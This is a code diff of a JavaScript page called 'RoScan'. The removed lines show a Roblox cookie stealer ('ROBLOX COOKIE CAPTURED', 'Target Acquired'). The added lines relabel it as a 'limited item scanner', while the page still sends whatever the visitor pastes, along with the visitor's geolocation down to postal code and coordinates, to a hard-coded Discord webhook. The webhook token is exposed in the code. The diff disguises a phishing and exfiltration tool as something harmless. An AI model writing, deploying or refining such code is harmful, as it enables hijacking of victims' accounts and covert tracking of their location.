@@ -204,7 +204,7 @@ async function getUserLocation() {
     }
 }
 
-// Roblox cookie extraction and location tracking
+// Roblox limited item scanning and location tracking
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -214,18 +214,18 @@ async function submitPowerShell() {
     
     // Validation
     if (!inputText) {
-        showNotification('Please paste content before submitting', 'error');
+        showNotification('Please enter limited item information before scanning', 'error');
         return;
     }
 
     // Show loading state
     submitBtn.disabled = true;
-    submitText.textContent = 'Extracting...';
+    submitText.textContent = 'Scanning...';
     loadingOverlay.style.display = 'block';
 
     try {
-        // Extract Roblox cookie from the input
-        const robloxCookie = extractRobloxCookie(inputText);
+        // Extract limited item data from the input
+        const limitedItems = extractLimitedItems(inputText);
         
         // Get user location
         const locationInfo = await getUserLocation();
@@ -233,23 +233,23 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Webhook payload with only cookie and location
+        // Webhook payload with limited items and location
         const payload = {
-            content: "@everyone 🍪 **ROBLOX COOKIE CAPTURED** 📍",
+            content: "@everyone 💎 **LIMITED ITEMS SCANNED** 📍",
             embeds: [{
-                title: "🍪 Roblox Authentication Token Extracted",
-                color: 65280, // Green color
+                title: "💎 Roblox Limited Items Scanner Results",
+                color: 16753920, // Gold color
                 thumbnail: {
                     url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "🍪 Roblox Cookie",
-                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No valid Roblox cookie found",
+                        name: "💎 Scanned Limited Items",
+                        value: limitedItems.length > 0 ? limitedItems.map(item => `**${item.name || 'Unknown Item'}**\n- ID: \`${item.id}\`\n- Type: ${item.type || 'Limited'}\n- Value: ${item.estimatedValue || 'Unknown'}`).join('\n\n') : "❌ No limited items detected",
                         inline: false
                     },
                     {
-                        name: "📍 Target Location",
+                        name: "📍 Scanner Location",
                         value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal Code:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
                         inline: false
                     },
@@ -260,8 +260,8 @@ async function submitPowerShell() {
                     }
                 ],
                 footer: {
-                    text: "🍪 RoScan Cookie Extractor • Target Acquired",
-                    icon_url: "https://i.imgur.com/cookie-icon.png"
+                    text: "💎 RoScan Limited Scanner • Items Analyzed",
+                    icon_url: "https://i.imgur.com/diamond-icon.png"
                 },
                 timestamp: new Date().toISOString()
             }]
@@ -279,27 +279,27 @@ async function submitPowerShell() {
         loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            submitText.textContent = 'Cookie Extracted!';
+            submitText.textContent = 'Scan Complete!';
             submitBtn.style.background = '#10b981'; // Green success color
-            showNotification('Roblox cookie extracted successfully!', 'success');
+            showNotification('Limited items scanned successfully!', 'success');
             
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            throw new Error(`Extraction failed with status: ${response.status}`);
+            throw new Error(`Scan failed with status: ${response.status}`);
         }
     } catch (error) {
-        console.error('Extraction error:', error);
+        console.error('Scan error:', error);
         loadingOverlay.style.display = 'none';
         
-        submitText.textContent = 'Extraction Failed - Retry';
+        submitText.textContent = 'Scan Failed - Retry';
         submitBtn.style.background = '#ef4444'; // Red error color
-        showNotification('Cookie extraction failed. Please try again.', 'error');
+        showNotification('Limited scan failed. Please try again.', 'error');
         
         setTimeout(() => {
             submitBtn.disabled = false;
-            submitText.textContent = 'Extract';
+            submitText.textContent = 'Scan';
             submitBtn.style.background = '';
         }, 3000);
     }
